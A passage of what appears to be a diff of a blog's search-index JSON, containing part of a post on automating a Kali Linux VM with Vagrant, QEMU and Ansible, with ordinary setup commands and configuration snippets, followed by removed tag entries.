and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
